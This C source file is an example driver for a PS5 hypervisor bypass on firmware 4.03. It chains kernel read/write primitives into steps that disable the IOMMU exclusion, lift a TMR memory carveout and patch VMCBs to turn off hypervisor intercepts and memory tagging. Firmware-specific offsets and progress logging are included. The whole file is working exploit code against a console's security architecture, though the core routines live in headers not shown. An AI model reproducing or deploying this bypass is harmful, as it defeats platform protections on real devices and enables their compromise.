/*
 * PS5 Hypervisor Bypass - Example usage with prosper0gdb kernel R/W
 *
 * This demonstrates how to integrate the hv_bypass module with
 * the existing prosper0gdb kernel R/W primitives from kstuff-no-fpkg.
 *
 * The approach (from fail0verflow/prosperous):
 *   1. Obtain kernel R/W via prosper0gdb (IPv6 pktopts)
 *   2. Compute DMAP base from kernel_pmap_store
 *   3. Use DMAP + PCIe ECAM to access SMN registers
 *   4. Disable IOMMU exclusion → full physical memory DMA
 *   5. Disable TMR index 20 → x86 can access MP4 carveout
 *   6. Scan for and patch VMCBs → disable HV intercepts + memory tagging
 *
 * Build: requires PS5_PAYLOAD_SDK and kernel R/W primitives.
 * For standalone testing, adapt the krw callbacks to your exploit.
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include "../include/hv_bypass.h"
#include "../include/smn.h"
#include "../include/iommu.h"

/*
 * These callbacks adapt to your specific kernel R/W primitive.
 * The example below assumes ps5/kernel.h copyin/copyout style.
 *
 * For prosper0gdb integration, replace with:
 *   copyin(dst, src, len)  → kernel write
 *   copyout(dst, src, len) → kernel read
 */

#ifdef USE_PS5_PAYLOAD_SDK
#include <ps5/kernel.h>

static void krw_write32(uint64_t kaddr, uint32_t val, void *arg)
{
    (void)arg;
    kernel_copyin(&val, kaddr, sizeof(val));
}

static uint32_t krw_read32(uint64_t kaddr, void *arg)
{
    (void)arg;
    uint32_t val = 0;
    kernel_copyout(kaddr, &val, sizeof(val));
    return val;
}

static void krw_copyin(uint64_t kdst, const void *usrc, size_t len, void *arg)
{
    (void)arg;
    kernel_copyin((void *)usrc, kdst, len);
}

static void krw_copyout(void *udst, uint64_t ksrc, size_t len, void *arg)
{
    (void)arg;
    kernel_copyout(ksrc, udst, len);
}

#else
/*
 * Stub implementations for compilation testing.
 * Replace with your actual kernel R/W when deploying.
 */
static void krw_write32(uint64_t kaddr, uint32_t val, void *arg)
{
    (void)kaddr; (void)val; (void)arg;
    /* TODO: implement with your kernel write primitive */
}

static uint32_t krw_read32(uint64_t kaddr, void *arg)
{
    (void)kaddr; (void)arg;
    /* TODO: implement with your kernel read primitive */
    return 0;
}

static void krw_copyin(uint64_t kdst, const void *usrc, size_t len, void *arg)
{
    (void)kdst; (void)usrc; (void)len; (void)arg;
}

static void krw_copyout(void *udst, uint64_t ksrc, size_t len, void *arg)
{
    (void)udst; (void)ksrc; (void)len; (void)arg;
}
#endif

/*
 * Compute DMAP base from kernel_pmap_store.
 * DMAP = pm_pml4 - pm_cr3
 * (Same approach as usermode_phys_mem in this repo)
 */
static uint64_t get_dmap_base(void)
{
#ifdef USE_PS5_PAYLOAD_SDK
    /* kernel_pmap_store offset for FW 4.03: 0x3215768 from kdata_base */
    /* pm_pml4 at +0x20, pm_cr3 at +0x28 */
    uint64_t ptrs[2];
    /* This offset should come from your offsets table */
    extern uint64_t kernel_pmap_store_addr; /* set by your init code */
    kernel_copyout(kernel_pmap_store_addr + 0x20, ptrs, sizeof(ptrs));
    return ptrs[0] - ptrs[1];
#else
    return 0; /* Stub */
#endif
}

int main(int argc, const char *argv[])
{
    printf("[hv_bypass] PS5 Hypervisor Bypass (FW 4.03)\n");
    printf("[hv_bypass] Based on fail0verflow/prosperous technique\n\n");

    /* Get DMAP base */
    uint64_t dmap = get_dmap_base();
    if (dmap == 0) {
        printf("[hv_bypass] ERROR: could not determine DMAP base\n");
        printf("[hv_bypass] Make sure kernel R/W is available\n");
        return 1;
    }
    printf("[hv_bypass] DMAP base: 0x%lx\n", dmap);

    /* Initialize bypass context */
    struct hv_bypass_ctx ctx;
    hv_bypass_init(&ctx, dmap,
                   krw_write32, krw_read32,
                   krw_copyin, krw_copyout,
                   NULL);

    /* Step 1: Disable IOMMU */
    printf("[hv_bypass] Step 1: Disabling IOMMU...\n");
    int ret = hv_bypass_disable_iommu(&ctx);
    if (ret != 0) {
        printf("[hv_bypass] WARN: IOMMU disable returned %d\n", ret);
        /* Continue anyway - may already be disabled */
    } else {
        printf("[hv_bypass] IOMMU exclusion set to cover all phys memory\n");
    }

    /* Step 2: Disable TMR (MP4 carveout) */
    printf("[hv_bypass] Step 2: Disabling TMR index 20 (MP4 carveout)...\n");
    ret = hv_bypass_disable_tmr(&ctx, 20);
    if (ret != 0) {
        printf("[hv_bypass] WARN: TMR disable returned %d\n", ret);
        printf("[hv_bypass] (expected on FW >= 5.00)\n");
    } else {
        printf("[hv_bypass] TMR 20 disabled, MP4 carveout accessible\n");
    }

    /* Step 3: Find and patch VMCBs */
    printf("[hv_bypass] Step 3: Scanning for VMCBs...\n");
    uint64_t vmcb_pas[16];
    int n_vmcbs = hv_bypass_find_vmcbs(&ctx, vmcb_pas, 16);
    printf("[hv_bypass] Found %d VMCB(s)\n", n_vmcbs);

    for (int i = 0; i < n_vmcbs; i++) {
        printf("[hv_bypass] Patching VMCB at PA 0x%lx...\n", vmcb_pas[i]);
        ret = hv_bypass_patch_vmcb(&ctx, vmcb_pas[i]);
        if (ret != 0) {
            printf("[hv_bypass] ERROR: VMCB patch failed for index %d\n", i);
            return 1;
        }
    }

    if (n_vmcbs > 0) {
        printf("[hv_bypass] All VMCBs patched successfully\n");
        printf("[hv_bypass] HV intercepts disabled, memory tagging cleared\n");
    } else {
        printf("[hv_bypass] No VMCBs found in scan range\n");
        printf("[hv_bypass] Try adjusting scan_start/scan_end in hv_bypass.c\n");
    }

    printf("[hv_bypass] Done.\n");
    return 0;
}
